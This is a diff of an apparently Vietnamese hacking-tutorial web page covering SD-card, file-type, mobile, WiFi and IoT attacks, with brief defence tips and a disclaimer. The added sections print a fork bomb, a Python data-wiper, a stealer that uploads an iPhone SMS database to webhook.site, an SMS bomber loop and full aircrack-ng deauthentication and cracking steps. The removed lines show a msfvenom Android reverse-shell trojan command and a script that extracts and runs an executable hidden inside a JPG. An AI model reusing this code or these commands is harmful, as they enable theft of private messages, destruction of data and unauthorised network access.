-#    Windows: copy /b cat.jpg + virus.exe secret.jpg
-#    Linux: cat cat.jpg virus.exe > secret.jpg
-
-# 3. File secret.jpg vẫn mở được như ảnh bình thường!
-# 4. Nhưng bên trong chứa virus.exe
-# 5. Khi chạy script giải nén, virus sẽ được tách ra
-
-# SCRIPT GIẢI NÉN VÀ CHẠY:
-# extract_virus.bat:
-@echo off
-type secret.jpg | findstr /v "JFIF" > virus.exe
-start virus.exe</pre>
+PHONG CHONG:
+Khong cam the SD la vao may
+Tat AutoRun/AutoPlay trong Windows
+Quet virus truoc khi mo
+Format the SD la truoc khi dung</pre>
             </div>
         </div>
 
-        <div class="box box-red">
-            <h3>3. Cách hack điện thoại qua thẻ nhớ SD</h3>
-            <pre>
-# CÁCH 1: MALWARE APK TRONG THẺ NHỚ
-# 1. Tạo file virus.apk (Android malware)
-# 2. Copy vào thẻ SD với tên hấp dẫn:
-#    - "Game_hay.apk"
-#    - "Crack_Spotify.apk"
-#    - "Mod_YouTube.apk"
-# 3. Đưa thẻ SD cho nạn nhân
-# 4. Khi họ cài APK → Điện thoại bị nhiễm
+        <!-- 10 -->
+        <div class="accordion">
+            <button class="accordion-header">CACH HOAT DONG CUA AI (TRI TUE NHAN TAO)</button>
+            <div class="accordion-content">
+                <h3>AI la gi?</h3>
+                <pre>Day 1 dua tre phan biet cho va meo.
+Cho no xem 10,000 anh cho + 10,000 anh meo.
+Sau do no tu nhan biet duoc -> Do la cach AI hoc!
 
-# CÁCH 2: EXPLOIT QUA FILE ẢNH/VIDEO
-# 1. Nhúng payload vào file MP4/PNG
-# 2. Khi nạn nhân mở file bằng app yếu
-# 3. App bị crash → Thực thi payload
-# 4. Ví dụ: Stagefright (Android)
-
-# CÁCH 3: SYMBOLIC LINK ATTACK
-# 1. Tạo symbolic link trong thẻ SD
-# 2. Trỏ đến file hệ thống nhạy cảm
-# 3. Khi app đọc thẻ SD, vô tình đọc file hệ thống
-
-# CÁCH PHÒNG CHỐNG:
-✅ Không cắm thẻ SD lạ vào máy
-✅ Tắt AutoRun/AutoPlay trong Windows
-✅ Không cài APK từ nguồn lạ
-✅ Quét virus thẻ SD trước khi mở
-✅ Format thẻ SD lạ trước khi dùng</pre>
+CAC LOAI AI:
+1. AI Hep (Narrow AI - ANI): Chi gioi 1 viec (ChatGPT, Siri)
+2. AI Tong Quat (AGI): Ngang con nguoi -> CHUA TON TAI
+3. AI Sieu Viet (ASI): Thong minh hon nhan loai -> CHUA TON TAI</pre>
+                <h3>Machine Learning hoat dong:</h3>
+                <pre>1. Thu thap du lieu (1 trieu anh, toan bo Wikipedia)
+2. Gan nhan (anh 1: Cho, anh 2: Meo...)
+3. Huan luyen: AI doan -> Sai -> Dieu chinh -> Lap lai
+4. Kiem tra: AI xem anh MOI -> Doan dung >95% -> Thanh cong</pre>
+                <h3>AI dung de hack:</h3>
+                <pre>1. Tao phishing email sieu that (ChatGPT)
+2. Crack mat khau nhanh hon (AI + Hashcat)
+3. Deepfake giong noi/video (lua chuyen tien)
+4. Tu dong tim lo hong (CodeQL, AI + SAST)
+5. Bypass CAPTCHA (nhan dien anh >99%)
+6. Social Engineering AI (chatbot goi dien lua dao 24/7)</pre>
+            </div>
         </div>
 
-        <!-- ========== CÁCH HOẠT ĐỘNG CỦA AI ========== -->
-        <h2>🤖 PHẦN 3: CÁCH HOẠT ĐỘNG CỦA AI (Trí Tuệ Nhân Tạo)</h2>
-
-        <div class="box box-blue">
-            <h3>1. AI là gì? (Giải thích siêu đơn giản)</h3>
-            <p><b>Tưởng tượng:</b> Bạn dạy 1 đứa trẻ phân biệt chó và mèo. Bạn cho nó xem 10,000 ảnh chó và 10,000 ảnh mèo. Sau đó nó tự nhận biết được. <b>Đó là cách AI học!</b></p>
-            <pre>
-# CÁC LOẠI AI:
-
-1. AI HẸP (Narrow AI - ANI):
-   - AI chỉ giỏi 1 việc
-   - Ví dụ: ChatGPT, Siri, Google Translate
-   - KHÔNG có ý thức, chỉ làm theo huấn luyện
-
-2. AI TỔNG QUÁT (General AI - AGI):
-   - AI ngang bằng con người
-   - Có thể làm mọi việc con người làm
-   - CHƯA TỒN TẠI (dự đoán 2050-2070)
-
-3. AI SIÊU VIỆT (Super AI - ASI):
-   - AI thông minh hơn toàn bộ nhân loại
-   - Có thể tự cải thiện bản thân
-   - CHƯA TỒN TẠI (nguy hiểm tiềm tàng)</pre>
+        <!-- 11 -->
+        <div class="accordion">
+            <button class="accordion-header">CAC LOAI FILE - CONG DUNG & CACH HACK</button>
+            <div class="accordion-content">
+                <h3>File .TXT</h3>
+                <pre>Van ban thuan, ghi chu, log, code.
+Hack: Gia mao duoi file (virus.txt.exe), nhung script doc.</pre>
+                <h3>File .PDF</h3>
+                <pre>Tai lieu khong thay doi dinh dang.
+Hack: Nhung JavaScript doc, exploit lo hong Adobe Reader, PDF phishing.
+Phong: Tat JavaScript, dung SumatraPDF.</pre>
+                <h3>File .ZIP / .RAR</h3>
+                <pre>Nen nhieu file thanh 1, giam dung luong.
+Hack: ZIP BOMB (42KB -> 4.5PB), ZIP Slip Attack, brute force mat khau.</pre>
+                <h3>File .APK (Android)</h3>
+                <pre>File cai ung dung Android.
+Hack: Tao APK doc (msfvenom), nhung malware vao APK that, permission abuse.
+Dau hieu: Xin quyen la, tu nguon khong chinh thong.</pre>
+                <h3>File .IPA (iOS)</h3>
+                <pre>File cai ung dung iPhone/iPad.
+Hack: Sideload IPA doc qua AltStore, fake app, enterprise certificate abuse.
+Chi cai duoc app ngoai neu jailbreak hoac sideload.</pre>
+            </div>
         </div>
 
-        <div class="box box-blue">
-            <h3>2. Machine Learning (Máy học) hoạt động thế nào?</h3>
-            <pre>
-# QUY TRÌNH MACHINE LEARNING:
+        <!-- 12 -->
+        <div class="accordion">
+            <button class="accordion-header">TAT CA CAC CACH LUA DAO CUA HACKER</button>
+            <div class="accordion-content">
+                <pre>1. PHISHING: Tao trang web gia mao -> Gui link -> Danh cap mat khau
 
-BƯỚC 1: THU THẬP DỮ LIỆU (Data Collection)
-- Ảnh: 1 triệu ảnh chó mèo
-- Text: Toàn bộ Wikipedia, sách, web
-- Số: Giá cổ phiếu 10 năm qua
+2. VISHING: Goi dien gia lam ngan hang/cong an -> Lua lay OTP
 
-BƯỚC 2: GẮN NHÃN (Labeling)
-- Ảnh 1: [Chó]
-- Ảnh 2: [Mèo]
-- Ảnh 3: [Chó]
-...lặp lại 1 triệu lần
+3. SMISHING: SMS gia mao trung thuong, giao hang -> Click link doc
 
-BƯỚC 3: HUẤN LUYỆN (Training)
-- Cho AI xem ảnh → AI đoán → So sánh với nhãn
-- Sai → Điều chỉnh "nơ-ron" (weight)
-- Đúng → Củng cố
-- Lặp lại hàng triệu lần
+4. LUA DAO MXH:
+   - Gia mao nguoi than: "Cho muon 5 trieu"
+   - Lua tinh cam: Ket ban, tan tinh, muon tien
+   - Lua viec lam: "Tuyen CTV Shopee, hoa hong 20%"
+   - Lua dau tu: "Forex lai 300%/thang"
+   - Lua qua tang: "Tang iPhone, chi tra ship 200k"
 
-BƯỚC 4: KIỂM TRA (Testing)
-- Cho AI xem ảnh MỚI (chưa từng thấy)
-- Nếu đoán đúng >95% → Thành công!
+5. TECH SUPPORT SCAM: Popup "May bi virus" -> Goi dien -> Cai TeamViewer -> Chiem may
 
-# VÍ DỤ NEURAL NETWORK ĐƠN GIẢN:
-Input (ảnh) → [Lớp 1] → [Lớp 2] → [Lớp 3] → Output (Chó/Mèo)
-              (phát hiện  (phát hiện  (phát hiện
-               cạnh)       hình dạng)   đặc điểm)</pre>
+6. SIM SWAP: Gia lam ban -> Goi nha mang -> Doi SIM -> Nhan OTP -> Chiem tai khoan
+
+DAU HIEU NHAN BIET LUA DAO:
+- URL la, sai chinh ta
+- Yeu cau gap: "Xac minh ngay!"
+- Khong co HTTPS
+- Email tu dia chi la
+- Yeu cau cung cap OTP, mat khau</pre>
+            </div>
         </div>
 
-        <div class="box box-red">
-            <h3>3. AI dùng để hack như thế nào?</h3>
-            <pre>
-# CÁCH HACKER DÙNG AI:
+        <!-- 13 -->
+        <div class="accordion">
+            <button class="accordion-header">ISH SHELL - LENH CO BAN TREN IPHONE</button>
+            <div class="accordion-content">
+                <pre>Cai dat: App Store -> Tim "iSH Shell" -> Cai dat.
 
-1. TẠO PHISHING EMAIL SIÊU THẬT:
-   - ChatGPT viết email lừa đảo không lỗi chính tả
-   - Bắt chước văn phong của sếp/người thân
-   - Tỉ lệ thành công cao hơn 300%
+LENH CO BAN:
+ls          -> Liet ke file/thu muc
+cd          -> Di chuyen thu muc
+pwd         -> Xem thu muc hien tai
+mkdir       -> Tao thu muc moi
+touch       -> Tao file moi
+rm          -> Xoa file
+rm -rf      -> Xoa thu muc (can than!)
+cp          -> Sao chep
+mv          -> Di chuyen/doi ten
+cat         -> Xem noi dung file
+echo        -> In ra man hinh
+chmod +x    -> Phan quyen thuc thi
+wget URL    -> Tai file tu internet
+curl URL    -> Gui HTTP request
 
-2. CRACK MẬT KHẨU NHANH HƠN:
-   - AI dự đoán mật khẩu dựa trên thói quen
-   - Hashcat + AI = Crack nhanh gấp 10 lần
-   - Dự đoán pattern: "TenCongTy2024!"
+CAI PACKAGES:
+apk update && apk upgrade
+apk add nmap python3 git curl wget openssh netcat-openbsd vim
 
-3. DEEPFAKE (Giả mạo video/giọng nói):
-   - Giả làm CEO gọi video yêu cầu chuyển tiền
-   - Vụ lừa đảo $243,000 ở Anh (2019)
-   - Deepfake audio + video
+SU DUNG NMAP:
+nmap -sn 192.168.1.0/24     -> Quet thiet bi trong mang
+nmap -sV target.com          -> Xem version dich vu
+nmap -p 1-1000 target.com    -> Quet 1000 port dau
 
-4. TỰ ĐỘNG TÌM LỖ HỔNG:
-   - AI quét code tìm bug (như CodeQL, Semgrep)
-   - Tự động sinh exploit từ mô tả lỗ hổng
-   - GPT-4 có thể viết malware theo yêu cầu
-
-5. BYPASS CAPTCHA:
-   - AI nhận diện chữ méo, ảnh giao thông
-   - Độ chính xác >99%
-   - Vượt qua reCAPTCHA tự động
-
-6. SOCIAL ENGINEERING AI:
-   - AI chatbot gọi điện lừa đảo 24/7
-   - Giọng nói tự nhiên, phản ứng thông minh
-   - Lừa hàng nghìn người cùng lúc</pre>
+NETCAT (NC):
+nc -lvp 4444                 -> Lang nghe port 4444
+nc target.com 4444           -> Ket noi den port</pre>
+            </div>
         </div>
 
-        <div class="box box-green">
-            <h3>4. AI trong bảo mật (Phòng thủ)</h3>
-            <pre>
-# AI GIÚP PHÒNG THỦ NHƯ THẾ NÀO?
+        <!-- 14 -->
+        <div class="accordion">
+            <button class="accordion-header">TAO VIRUS NHANH TREN IPHONE/ANDROID</button>
+            <div class="accordion-content">
+                <pre>1. FORK BOMB (Treo may):
+:(){ :|:& };:    (Bash)
 
-1. PHÁT HIỆN BẤT THƯỜNG:
-   - AI quét 1 triệu events/giây
-   - Phát hiện hành vi lạ: Đăng nhập lúc 3h sáng
-   - Cảnh báo real-time
+2. VIRUS XOA DU LIEU (Python):
+import os, shutil
+shutil.rmtree("/var/mobile/Documents/")
 
-2. PHÂN TÍCH MALWARE:
-   - AI phân tích file nghi ngờ trong sandbox
-   - Phát hiện malware chưa từng thấy (zero-day)
-   - Học từ hàng triệu mẫu malware
+3. STEALER (Danh cap du lieu):
+import requests
+files = ['/var/mobile/Library/SMS/sms.db']
+for f in files:
+    requests.post('https://webhook.site/ID', files={'file': open(f,'rb')})
 
-3. DỰ ĐOÁN TẤN CÔNG:
-   - AI dự đoán mục tiêu tiếp theo của hacker
-   - Phân tích pattern tấn công
-   - Chủ động vá lỗ hổng</pre>
+4. FAKE UPDATE (Lua dao):
+while True:
+    print("DANG CAP NHAT... KHONG TAT NGUON!")
+    time.sleep(1)
+
+5. SMS BOMBER:
+import requests
+while True:
+    requests.get("https://api.gateway.com/sms?phone=0123456789")</pre>
+            </div>
         </div>
 
-        <!-- ========== CÁC LOẠI FILE ========== -->
-        <h2>📁 PHẦN 4: CÁC LOẠI FILE - CÔNG DỤNG VÀ CÁCH HACK</h2>
+        <!-- 15 -->
+        <div class="accordion">
+            <button class="accordion-header">CACH HOAT DONG CUA ANDROID & iOS</button>
+            <div class="accordion-content">
+                <h3>iOS Architecture:</h3>
+                <pre>Cocoa Touch (UIKit, SwiftUI) -> Giao dien
+Media (Core Audio, Video) -> Am thanh, hinh anh
+Core Services (Core Data, Foundation) -> Dich vu cot loi
+Core OS (Kernel XNU, APFS) -> Quan ly phan cung
 
-        <div class="box box-yellow">
-            <h3>1. File .TXT (Text - Văn bản thuần)</h3>
-            <pre>
-# CÔNG DỤNG:
-- Lưu văn bản không định dạng
-- Ghi chú, log, code, config
-- Có thể mở bằng mọi trình soạn thảo
+Bao mat iOS:
+Secure Boot Chain -> Sandbox -> Code Signing -> ASLR -> DEP -> Keychain</pre>
+                <h3>Android Architecture:</h3>
+                <pre>System Apps -> Java API Framework -> Android Runtime + Native Libs
+-> Hardware Abstraction Layer (HAL) -> Linux Kernel
 
-# CÁCH HACK QUA FILE .TXT:
-1. Giả mạo đuôi file: virus.txt.exe (Windows ẩn .exe)
-2. Nhúng script độc: file.txt chứa mã PowerShell
-3. Unicode homograph: Dùng ký tự trông giống chữ cái
-4. File .txt quá lớn gây crash Notepad
-5. Macro trong file .txt mở bằng Word</pre>
+Bao mat Android:
+Verified Boot -> SELinux -> App Sandbox -> Permissions -> Google Play Protect</pre>
+            </div>
         </div>
 
-        <div class="box box-yellow">
-            <h3>2. File .PDF (Portable Document Format)</h3>
-            <pre>
-# CÔNG DỤNG:
-- Tài liệu không thay đổi định dạng
-- Hỗ trợ form, chữ ký số, multimedia
-- Chuẩn công nghiệp cho văn bản
+        <!-- 16 -->
+        <div class="accordion">
+            <button class="accordion-header">WIFI HACKING - CACH HOAT DONG & TAN CONG</button>
+            <div class="accordion-content">
+                <pre>WIFI HOAT DONG:
+Dung song vo tuyen 2.4GHz hoac 5GHz.
+Chuan: 802.11b/g/n/ac/ax (WiFi 6).
+AP (Router) <-song-> STA (Thiet bi)
 
-# CÁCH HACK QUA FILE .PDF:
-1. NHÚNG JAVASCRIPT ĐỘC:
-   - PDF có thể chứa JavaScript
-   - Mở file → Script tự chạy
-   - Tải malware, đánh cắp dữ liệu
+BAO MAT WiFi:
+WEP (qua yeu, crack trong vai phut)
+WPA/WPA2 (manh hon, bat handshake roi crack)
+WPA3 (manh nhat, kho crack)
 
-2. EXPLOIT LỖ HỔNG ADOBE READER:
-   - CVE-2021-28550: Buffer overflow
-   - Mở PDF → Thực thi mã từ xa
-   - Không cần click thêm gì
+CAC BUOC TAN CONG WPA2:
+1. Bat monitor mode: airmon-ng start wlan0
+2. Quet mang: airodump-ng wlan0mon
+3. Chon muc tieu, bat handshake: airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+4. Deauth client de bat handshake: aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon
+5. Crack password: aircrack-ng -w wordlist.txt capture-01.cap
 
-3. PDF PHISHING:
-   - Giả mạo hóa đơn, hợp đồng
-   - Chứa link đến trang phishing
-   - Form điền thông tin giả
-
-4. ẨN FILE TRONG PDF:
-   - Nhúng .exe, .zip vào PDF
-   - Trích xuất và chạy bằng script
-
-# CÁCH PHÒNG:
-✅ Không mở PDF từ nguồn lạ
-✅ Tắt JavaScript trong Adobe Reader
-✅ Dùng trình đọc PDF nhẹ (SumatraPDF)
-✅ Cập nhật phần mềm thường xuyên</pre>
+PHONG CHONG:
+Dung WPA3 hoac WPA2 + mat khau manh (>12 ky tu)
+Tat WPS
+An SSID (ko hieu qua lam)
+Mac filtering</pre>
+            </div>
         </div>
 
-        <div class="box box-yellow">
-            <h3>3. File .ZIP / .RAR (Nén)</h3>
-            <pre>
-# CÔNG DỤNG:
-- Nén nhiều file thành 1
-- Giảm dung lượng
-- Bảo vệ bằng mật khẩu
+        <!-- 17 -->
+        <div class="accordion">
+            <button class="accordion-header">CACH HOAT DONG CUA VIRUS</button>
+            <div class="accordion-content">
+                <pre>VIRUS LA GI?
+Phan mem doc hai, tu nhan ban nhu virus sinh hoc.
+Can "vat chu" (file, chuong trinh) de ton tai.
 
-# CÁCH HACK QUA FILE .ZIP:
-1. ZIP BOMB (Bom nén):
-   - File zip nhỏ (vài KB) nhưng giải nén ra hàng TB
-   - Làm đầy ổ cứng, crash server
-   - Ví dụ: 42.zip (42KB → 4.5PB khi giải nén)
+CAC LOAI VIRUS:
+1. File Infector: Lay nhiem file .exe, .com
+2. Macro Virus: Lay nhiem file Word, Excel
+3. Boot Sector Virus: Lay nhiem boot sector o cung
+4. Worm: Tu lay lan qua mang, khong can file vat chu
+5. Trojan: Gia mao phan mem hop phap
+6. Ransomware: Ma hoa file, doi tien chuoc
+7. Spyware: Giam sat nguoi dung
+8. Adware: Hien thi quang cao
+9. Rootkit: An minh, chiem quyen root
+10. Keylogger: Ghi lai phim bam
 
-2. ZIP SLIP ATTACK:
-   - File trong zip có tên: ../../../etc/passwd
-   - Khi giải nén, file bị ghi đè vào thư mục hệ thống
-   - Ghi đè file quan trọng
+CACH VIRUS LAY LAN:
+1. Email attachment
+2. USB/ The nho
+3. Tai file tu web doc
+4. Khai thac lo hong phan mem
+5. Mang noi bo (worm)
 
-3. MẬT KHẨU BẢO VỆ:
-   - Brute force mật khẩu zip
-   - Dùng john: zip2john file.zip > hash
-   - john hash
-
-4. NHÚNG MALWARE:
-   - Virus trong file zip
-   - Kẻ tấn công gửi file: "Hoa_don.zip"
-   - Bên trong: Hoa_don.pdf.exe (giả mạo)</pre>
+CACH VIRUS HOAT DONG:
+1. Lay nhiem (Infection): Chen ma doc vao file/sys
+2. Kich hoat (Trigger): Mo file, chay chuong trinh
+3. Thuc thi (Payload): Danh cap du lieu, pha hoai
+4. Nhan ban (Replication): Tu copy sang file/ may khac</pre>
+            </div>
         </div>
 
-        <div class="box box-yellow">
-            <h3>4. File .APK (Android Package)</h3>
-            <pre>
-# CÔNG DỤNG:
-- File cài đặt ứng dụng Android
-- Chứa code, tài nguyên, manifest
-- Có thể cài từ CH Play hoặc sideload
+        <!-- 18 -->
+        <div class="accordion">
+            <button class="accordion-header">TV HACKING & IoT HACKING</button>
+            <div class="accordion-content">
+                <pre>TV THONG MINH (Smart TV):
+Chay he dieu hanh: Tizen (Samsung), WebOS (LG), Android TV (Sony, Xiaomi).
+Ket noi WiFi, Bluetooth, HDMI.
 
-# CÁCH HACK QUA FILE .APK:
+CACH HACK TV:
+1. WiFi Deauth: Dung Flipper Zero gui goi deauth -> TV mat ket noi
+2. SSDP Exploit: Khai thac UPnP/SSDP protocol
+3. Remote App Gia: Ket noi qua WiFi, dieu khien TV
+4. HDMI-CEC Exploit: Dieu khien TV qua cong HDMI
+5. Firmware Attack: Flash firmware doc qua USB (can quyen truy cap)
 
-1. TẠO APK ĐỘC HẠI (Trojan):
-   msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o virus.apk
-   # Tạo APK kết nối ngược về máy hacker
-   # Khi nạn nhân cài → Hacker điều khiển điện thoại
+IoT (Internet of Things) HACKING:
+Thiet bi IoT: Camera, den thong minh, khoa cua, lo vi song...
+Nhieu thiet bi IoT co bao mat kem.
+Mat khau mac dinh, khong ma hoa, firmware loi.
 
-2. NHÚNG MALWARE VÀO APK THẬT:
-   - Tải APK game/app phổ biến
-   - Dùng tool (ApkEasyTool) để decompile
-   - Thêm code độc vào
-   - Build lại APK mới
-   - Phát tán qua web, Telegram
-
-3. PERMISSION ABUSE:
-   - APK xin quyền: SMS, Camera, Microphone, Location
-   - Đọc trộm tin nhắn OTP ngân hàng
-   - Quay lén, nghe lén, theo dõi GPS
-
-4. CLICKER FRAUD:
-   - APK chạy ngầm, tự động click quảng cáo
-   - Kiếm tiền cho hacker
-   - Nạn nhân không biết
-
-# DẤU HIỆU APK ĐỘC:
-❌ Yêu cầu quyền lạ (SMS, Accessibility)
-❌ Từ nguồn không chính thức
-❌ Tên file lạ: "Mod_Game.apk"
-❌ Dung lượng nhỏ bất thường</pre>
-        </div>
-
-        <div class="box box-yellow">
-            <h3>5. File .IPA (iOS App Store Package)</h3>
-            <pre>
-# CÔNG DỤNG:
-- File cài đặt ứng dụng iPhone/iPad
-- Chỉ cài được qua App Store (chính thức)
-- Cần jailbreak hoặc sideload để cài file .ipa ngoài
-
-# CÁCH HACK QUA FILE .IPA:
-
-1. SIDELOAD IPA ĐỘC:
-   - Dùng AltStore, Sideloadly để cài IPA ngoài
-   - Cần Apple ID (có thể dùng ID ảo)
-   - Giới hạn 7 ngày (free) hoặc 1 năm (trả phí)
-
-2. JAILBREAK + MALWARE:
-   - Máy đã jailbreak dễ bị cài malware hơn
-   - IPA độc có thể truy cập toàn bộ hệ thống
-   - Đánh cắp: SMS, ảnh, danh bạ, keychain
-
-3. FAKE APP:
-   - Tạo app giả mạo (Facebook++, WhatsApp++)
-   - Có thêm tính năng nhưng chứa spyware
-   - Nạn nhân tự nguyện cài đặt
-
-4. ENTERPRISE CERTIFICATE ABUSE:
-   - Dùng chứng chỉ doanh nghiệp để ký IPA
-   - Phát tán qua web, không cần App Store
-   - Apple thường thu hồi sau vài ngày
-
-# CÁCH PHÒNG:
-✅ Chỉ cài app từ App Store chính thức
-✅ Không jailbreak nếu không cần thiết
-✅ Kiểm tra chứng chỉ của app
-✅ Không tin app "Mod", "Hack" trên mạng</pre>
+PHONG CHONG:
+Doi mat khau mac dinh
+Cap nhat firmware
+Tat UPnP tren router
+Mang rieng cho IoT (VLAN)</pre>
+            </div>
         </div>
 
         <div class="warning">
-            ⚠️ <b>TUYÊN BỐ MIỄN TRỪ TRÁCH NHIỆM:</b> Tài liệu này chỉ dành cho mục đích <b>HỌC TẬP VÀ NGHIÊN CỨU BẢO MẬT</b>. 
-            Mọi hành vi sử dụng vào mục đích bất hợp pháp đều bị <b>NGHIÊM CẤM</b> và có thể dẫn đến <b>TRUY CỨU HÌNH SỰ</b>.
-            Hãy trở thành <b>WHITE HAT HACKER</b> - người bảo vệ internet!
+            TUYEN BO MIEN TRU TRACH NHIEM: Tai lieu nay chi danh cho muc dich HOC TAP VA NGHIEN CUU BAO MAT.
+            Moi hanh vi su dung vao muc dich bat hop phap deu bi NGHIEM CAM va co the dan den TRUY CUU HINH SU.
+            Hay tro thanh WHITE HAT HACKER - nguoi bao ve internet!
         </div>
 
     </div>
+
+    <script>
+        document.querySelectorAll('.accordion-header').forEach(button => {
+            button.addEventListener('click', () => {
+                button.classList.toggle('active');
+                const content = button.nextElementSibling;
+                content.classList.toggle('show');
+            });
+        });
+    </script>
 </body>
 </html>
